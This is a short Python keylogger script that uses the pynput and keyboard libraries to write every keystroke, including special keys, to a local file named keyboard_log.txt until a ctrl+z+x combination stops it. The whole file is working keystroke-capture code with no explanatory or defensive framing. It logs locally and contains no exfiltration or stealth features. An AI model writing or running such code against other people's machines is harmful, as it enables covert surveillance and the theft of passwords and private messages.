import keyboard, sys
from pynput.keyboard import Listener
def on_press(key):
    if keyboard.is_pressed('ctrl') and keyboard.is_pressed('z') and keyboard.is_pressed('x'):
        return False
    else:
        with open("keyboard_log.txt", "a") as f:
            if keyboard.is_pressed('space'):
                f.write(' ')        #space
            elif keyboard.is_pressed('enter'):
                f.write('\n')       #enter
            elif keyboard.is_pressed('tab'):
                f.write('    ')     #tab
            elif 'Key' in str(key):
                f.write(' ' + str(key) + ' pressed\n')   #Special keys
            else:
                f.write(str(key))   #Letters and Digits
if __name__ == "__main__":
    with Listener(on_press=on_press) as listener:
            listener.join()